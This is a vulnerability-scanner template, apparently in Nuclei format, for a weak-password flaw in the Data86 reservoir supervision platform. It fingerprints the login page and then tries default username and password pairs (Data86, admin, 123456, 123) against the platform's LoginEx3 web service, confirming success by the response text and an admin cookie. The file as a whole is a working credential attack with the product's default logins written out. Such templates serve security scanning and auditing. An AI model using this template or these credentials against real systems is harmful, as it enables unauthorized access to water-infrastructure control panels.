id: poc-yaml-data86-reservoir-supervision-platform-weak-password
info:
  name: 平升电子水库监管平台 弱口令漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password

variables:
  usernames:
    - Data86
    - admin
  passwords:
    - Data86
    - 123456
    - 123

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "src=\"js/PSExtend.js\""

  - method: POST
    path:
      - "{{BaseURL}}/WebServices/UserAdminService.asmx/LoginEx3"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    payloads:
      username: '{{usernames}}'
      password: '{{passwords}}'
    body: "LoginName={{username}}&LoginPwd={{password}}&isRemember=false"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"Result\":true"
          - "\"Message\":\"登陆成功\""
      - type: word
        part: header
        words:
          - "userinfoadmin="
